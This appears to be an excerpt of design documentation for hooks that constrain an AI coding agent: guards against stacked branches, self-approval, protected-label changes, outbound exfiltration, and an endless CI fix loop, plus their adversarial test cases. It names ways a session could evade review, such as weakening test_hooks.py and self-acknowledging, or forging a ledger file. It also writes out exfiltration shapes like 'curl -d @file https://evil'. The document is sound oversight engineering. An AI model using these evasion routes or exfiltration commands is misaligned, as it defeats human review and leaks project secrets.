...
| **Stacking a branch or a PR** — cutting a branch whose start point carries commits no base branch has (`checkout -b`/`switch -c`/`git branch`/`worktree add`, **including the implicit start point**: branching again while HEAD is on a feature branch — how the 2026-09-20 stack grew); bringing another feature branch's work in (`merge`, `pull`, `rebase` onto it, `push HEAD:<other>`); basing a PR on a non-base branch (`gh pr create\|edit --base`, `gh api` to `/pulls`, `gh_fallback.py pr-create --base`, the `gh-merge-base` config). Also, as part of the config anchor: repointing `refs/remotes/origin/HEAD` (`symbolic-ref`, a fetch refspec into it), because this guard trusts it | Bash | **Every branch is cut from the base branch and merges back into it.** Squash-merging a base *rewrites* the base branch, so every PR stacked on it turns CONFLICTING at once — and GitHub runs **no checks at all** on a conflicted PR, so they read as "no checks reported", which looks like broken CI. A six-deep stack (#153←#154←#155←#156←#157←#158, 2026-09-20) cost five forced re-cascades and ended with four PRs closed. **Judged by content, not name:** a start point is fine when every commit it carries is already on a base branch (`git rev-list <start> --not <base tips>` is empty) — so a fresh `claude/<codename>` worktree branch, a tag or SHA on main, or a detached HEAD on main pass, and a branch with one commit of its own does not, whatever it is called (`feat/main` included). **Bringing the base in stays allowed** — `git fetch origin main && git merge origin/main` is what the conflict loop asks a session to run — as do rebasing onto the base, `rebase --onto origin/main <old-base>` (the way off a stack), and syncing a branch from its own remote copy (`git merge @{u}`, `git pull origin <this-branch>`). **Reads the raw command** through its own quote-aware lexer: comments, redirections (`2>&1`), heredoc bodies and line continuations are dropped, separators only split outside quotes, and `$(…)`, subshells, `sh -c` and literal `eval` are followed; linear in the command's length. **Fail direction:** a ref the hook cannot see (`$VAR`, `$(…)` output, `FETCH_HEAD`, `-`, `@{-N}`) fails *closed* with a message naming the literal ref to use; a checkout with no base branch to measure against, and any git failure while measuring, fail *open*. Base branches = `main`/`master` + `github.defaultBranch` from a **committed** `delivery.json` + the remote's recorded default (`origin/HEAD`) — never the worktree copy, **widening only**. Advisory like every Bash guard (19 of 28 adversarial spellings held); the durable halves are the Stop hook's `baseRefName` check and the `PR base` workflow |
...
| **Approving a PR** — `gh pr review --approve` in every spelling (long, `-a`, pflag shorthand clusters like `-ab`, `--approve=true`), the **bare** `gh pr review`, `gh api`/GraphQL writes carrying `event: APPROVE`, and a hand-rolled `curl` at `/pulls/<n>/reviews` | Bash | **An approval is the human's action, for the same reason a merge is** — the same defect class as the label row below. An approval is not a status bit: it is a claim to the next reviewer that somebody *else* read the code, and under branch protection it can be the thing that unlocks the merge. A session holds Bash and a working `gh` credential, so self-approving is one command. Blocked → **print the command for the human**, exactly as for a hook edit. `--comment` and `--request-changes` stay allowed — neither manufactures a human signal — as do reading reviews and `--add-reviewer` (*asking* for a review is not giving one). The **bare** form fails closed because it picks its event at a prompt the hook cannot see, as does a `gh api` write whose event hides in an `--input` body. `api.github.com` is on the egress allowlist, so the `curl` spelling is caught here or nowhere. A shell denylist is never exhaustive: the durable half is a branch-protection rule that will not count the PR author's own review |
| Applying **or removing** a protected label — `gh pr\|issue edit --add-label`/`--remove-label`, `gh pr\|issue create --label`/`-l`, and `gh api` writes to `/issues/<n>/labels` | Bash | **An acknowledgement is the human's action, for the same reason a merge is.** The set is contract §6 verbatim — `hooks-change`, `agent:*`, `blocked:*`, `provenance:*` — so this GitHub path and the tracker path (§8) refuse the same labels. `hooks-change` is what turns *Hooks change guard* green, so a session that can apply it acknowledges its own guard-machinery change and deletes the signal telling a reviewer to look closely. The reachable target is not a hook (self-protection covers those) but **`test_hooks.py`, deliberately not self-protected** — weaken a battery case, self-acknowledge, and the PR reads as ordinary. Blocked → **print the command for the human**, exactly as for a hook edit. Reading/listing labels is free, so is any *unrelated* label (`bug`), and so is `gh label create` — *defining* a label is setup, not acknowledgement. A shell denylist is never exhaustive: the durable half is `scripts/check_grader_paths.py` checking **who** applied it |
...
| **Egress/exfiltration shapes** — a network tool (`curl`/`wget`/`scp`/`sftp`/`nc`) targeting a **non-allowlisted host** *while* uploading (`-d`/`--data*`/`-F`/`-T`/`-X POST\|PUT\|PATCH`), sending an `@file` payload, splicing `$VAR` into the URL, or any `scp`/`nc` push | Bash | Under `bypassPermissions` an outbound `curl -d @file https://evil` runs unprompted. Allowlist is a **domain-boundary suffix** match (`evil-github.com` and `github.com.evil.tld` do *not* pass): localhost, `github.com`, `githubusercontent.com`, `anthropic.com`, `npmjs.org` + a fenced stack-specific slot (ships with `linear.app`, the issue-tracker API this kit's own sessions call; replace it with YOUR project's backends — the commented worked example beside it is a managed-backend host pair). Plain GETs/downloads stay allowed. **Why `linear.app` sits in the slot, enabled, rather than in the core or off:** it cannot ship *off* — `.claude/skills/setup-board/SKILL.md` tells a session to POST to `api.linear.app/graphql` for the seven operations Linear's MCP does not cover, and this file is self-protected, so a session that hit the block could not lift it; a kit that ships a skill tripping its own guard has a bug, not a default. It does not belong in the **core**, which is for hosts no project may remove — Linear is one tracker among many and the pipeline using it is optional (contract §2). The slot's usual cost, the kit's copy diverging from the shipped template, does not arise: the kit ships exactly **one** copy of this hook (there is no `templates/hooks/pre-tool-use.py`). What the placement does *not* buy is narrowing — it is a review label, not a second file, so the entry is live for every project instantiated from the kit, Linear or not. What it buys is a signpost that it is one line and yours to delete, which `BOOTSTRAP-PROMPT.md` step 2 now says out loud |
...
| The open PR's **base is not the base branch** (`baseRefName` ∉ `main`/`master` + a committed `github.defaultBranch` + `origin/HEAD`'s branch — and, asked only then, ≠ GitHub's own default via `gh repo view`) | **Every PR branches off the base and merges back into it.** Unlike the PreToolUse guard this reads GitHub's *own record*, so it does not care how the PR was created — a respelled command, the web UI, an automation. It deliberately fires on a **green** PR: a stacked PR looks fine right up until its base is squash-merged, and then every descendant turns CONFLICTING and GitHub stops running checks on it (six-deep stack, 2026-09-20 — five forced re-cascades). Asked **before** the rollup, and said **once per commit**: the next turn-end on the same commit falls through to the DIRTY and failing-CI triage and the fix budget, so a stacked PR that is also red is never hidden behind this message. The message names `gh pr edit <n> --base <base>` and `git rebase --onto`, and, unlike the two below, deliberately not `/fix-ci`. Says nothing when gh cannot name the default branch — and, like every check here, runs only where gh can reach GitHub (not the dispatcher sandbox) |
| *(notice only)* The PR was **merged into a feature branch** | Not a block — there is nothing left to fix on this branch — but the work never reached the base and nothing goes red, so it is said once (contract §13: "could not" must not read as "nothing to do") |
| The open PR has **failing CI** (`FAILURE`/`CANCELLED`/`TIMED_OUT`/…) | CI must be watched to green before a task is "done" |
| The open PR is **`DIRTY`** (merge conflicts) | GitHub can't build the merge ref, so the required `pull_request` CI **never runs** — only side checks (CodeQL/Vercel) report and can look green. A conflicted PR must be rebased, not mistaken for passing (2026-07-03 near-miss). Fires only on explicit `DIRTY`, never the transient `UNKNOWN` right after a push. Checked **before** the rollup: fixing code cannot fix a conflict, so a PR that is both conflicted and red is triaged as a conflict or the session edits code that was never the problem |

**The message is the mechanism.** A hook can block and it can inject text; it cannot make
the model run a skill. So both not-green messages **name `/fix-ci`** — the loop the kit
already ships, which triages conflicts first, reads each failing job's log, pushes the
smallest fix and re-watches. The block is what a session cannot skip; naming the tool is
what keeps the unskippable part from producing an improvised fix loop.

**One bounded budget, shared by those two reasons** (`MAX_FIX_ATTEMPTS = 3` — deliberately
the same number as `/fix-ci`'s own bound and `budgets.fixIterations`' default in
`docs/PIPELINE-CONTRACT.md` §1; three places, one number, change them together). The dedup
above only stops a loop on an *unchanged* commit — a session pushing fixes gets a new sha
every turn and was nagged indefinitely, including for failures **no session can clear**: a
change under `.github/workflows/`, which a dispatched session's push credential
deliberately may not land by `git push` or by the REST contents API, or a rebase the
sandbox refuses (both observed live 2026-09-08). So the red message names that class up
front, and after three commits the hook:

1. **escalates once** — a final block saying stop fixing, and demanding a written report of
   every check still red, each fix tried, and whether a session can fix it at all;
2. then **stops blocking**, emitting a non-blocking `systemMessage` per commit instead.
   Blocking on would trap the session in the loop it was just told to stop; silence would
   render "could not do it" identically to "nothing to do" (`PIPELINE-CONTRACT.md` §13).
   That notice is the advisory half — the guaranteed half is the block that preceded it.

Two ledger files per branch sit beside the dedup markers: `<branch>__attempts` (one HEAD
sha per line, so a reason switch on one commit can't charge it twice) and
`<branch>__exhausted`. A PR observed with **nothing** red and no conflict clears both, so
the bound means "three attempts at *this* failure", not "three ever on this branch". A PR
red **only** on a human-pending check does neither: it is no evidence the loop worked, so
it never spends an attempt and never clears one.

**Clearing needs positive evidence of green, and "no failures" isn't it.** A rollup whose
checks are still queued has no failing conclusions — and neither does an empty one. Reading
that as success would reset the ledger on the single commonest turn in the loop (push a
fix, CI queues, the turn ends), and the bound would then almost never be reached. The hook
requires the positive form: checks exist, every one has a conclusion, none of them failed.

**`statusCheckRollup` returns one entry per RUN, not per check name.** A check that was red
and has since been re-run green appears **twice**, old conclusion and new, so taking the
list at face value reads a genuinely green PR as red. Found on this kit's own PR #92
(2026-09-09): a re-run `Hooks change guard` reported `FAILURE` *and* `SUCCESS` while
`gh pr checks` said pass and `mergeStateStatus` was `CLEAN`. Before the budget existed that
cost one spurious nag; with it, the same stale entry would spend an attempt and could
...
> `__exhausted` adds is that a single forged file downgrades every future block on that
> branch to an advisory notice, where forging a dedup marker only ever bought one commit.
> This hook is a workflow nag, not a security boundary — the same "advisory, not robust"
> class as the Bash pattern guards (docs/SECURITY.md) — and the durable layer is unchanged:
> CI plus branch protection, which no session can write. Worth knowing before anyone cites
> the bound as a guarantee.
...
326 block/allow cases covering every guard above, plus 18 assertions that block reasons arrive **on stderr** (the stream exit 2 relays) — the self-protection cases (edit/mutate a hook → block, incl. the widened git/chmod/awk/interpreter net and `settings.local.json`; read/stage → allow, incl. that a redirect must *target* a protected path), the path-target secret-read cases (`xxd`/`od`/`strings`/`grep`/`base64`/`source`/`node -e` on `.env.local` block; `process.env`, `obj.key`, `.env.example` allow), the egress-guard cases (exfil shapes to unknown hosts block, as do the `evil-github.com`, `linear.app.evil.tld` and `evil-linear.app` lookalikes — **both** boundary shapes for the stack-specific tier, prefix and suffix, since `host == s or host.endswith("." + s)` has to reject a host that merely *ends in* the allowlisted string as well as one that merely *starts* with it; the same shapes to allowlisted hosts, including `api.linear.app`, and plain GETs allow), the **staging-mirror** cases (a pinned session's Edit/Write and Bash mutations of `templates/workflows/**` and `templates/hooks/**` block exactly as their `.github/workflows/**` and `.claude/hooks/**` destinations do — plus the activation `git mv` itself, reads, the unpinned fail-open, the pipeline-off allow, and two over-reach guards proving `templates/README.md` and `templates/scripts/**` stay editable), the anchored-`rm` false-positive filenames, the v2 prose-stripping allows, sandboxed branch-guard/branch-naming cases (throwaway git repos pinned to `main` / `master` / a codename / a feature branch, run with cwd at the sandbox root so results don't depend on this repo's current branch or CI's detached HEAD), real-worktree sandboxes for the cross-worktree guard **including the item-7 subagent cases** (controlled cwd + `CLAUDE_PROJECT_DIR`: a genuine subagent's own-worktree writes allow, parent-checkout writes block, branch checks follow the acting session) **and the cwd-attack cases** (a main session that cd'd, or a cwd inside an unrelated repo, can never widen the root — each of these fails against a cwd-derived-root implementation), the fail-closed crafted-`tool_input` case, merged-PR and never-merge guard cases against a **mocked `gh`** (no network), the self-approval cases (every spelling that yields an APPROVE event blocks; `--comment`/`--request-changes`, review reads and `--add-reviewer` allow), the **pipeline-guard cases** (throwaway repos with a committed `delivery.json` and a real dispatcher pin written outside the worktree — including four that pin *off is not broken* for projects without the pipeline, the adversarial disarmed-working-tree-config case, both casings of the ticket-branch comparison, a case for each of the two places a grader path is declared, and the fail-direction cases for broken config / malformed / expired / foreign-worktree pins), and Stop-hook cases including the DIRTY-PR block (its exit-0 + JSON-decision protocol, plus the dedup that prevents nag loops) **and the bounded fix loop** — two message-content assertions (a red PR's nag names `/fix-ci` and the class no session can land; a PR that is conflicted *and* red is triaged as a conflict, never as a code fix) plus nine over a SEQUENCE of turns, since a bound is invisible in any single one: a human-pending-only red spends nothing, three reds each earn one numbered nag, the fourth escalates instead of asking again, past it the hook stops blocking but not speaking, and a green PR clears the ledger so a later failure starts at 1. Each was made red by reverting the line it covers. Eight more cover what the first round shipped wrong: in-flight CI must not clear the budget, a re-run check's stale `FAILURE` must not make a green PR red, a `DIRTY` turn must spend from the same counter as red CI, and clearing must forget the exhausted marker too. Runs in CI on every PR; also available as `npm run test:hooks`
...
95 probes across the seven **Bash pattern** guards (secret paths, destructive ops,
egress, never-merge, self-approval, protected labels, stacked branches), each recorded
with the result observed on 2026-08-26 — or, for `stacked-branch`, on 2026-09-20 when
that guard was added, in a realistic repo (`make_stack_repo`) because it judges by
content and the one-commit sandbox has no `main` to judge against. Every probe recorded as getting through is then executed in a throwaway
...
guards actually carry* — updated in the same PR. **All seven guards currently classify as
